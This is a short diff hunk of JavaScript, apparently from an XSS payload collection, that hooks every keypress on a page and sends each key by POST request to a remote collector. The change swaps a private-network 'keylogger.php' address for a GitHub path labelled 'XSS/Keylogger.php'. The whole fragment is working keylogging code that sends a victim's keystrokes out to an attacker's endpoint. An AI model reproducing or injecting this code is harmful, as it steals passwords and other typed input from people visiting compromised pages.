@@ -4,7 +4,7 @@ document.onkeypress = function(evt) {
     if (key) {
         var http = new XMLHttpRequest();
         var param = encodeURI(key)
-        http.open("POST","http://192.168.135.138/keylogger.php",true);
+        http.open("POST","https://github.com/2733683116/agrying/blob/main/XSS/Keylogger.php",true);
         http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
         http.send("key="+param);
     }
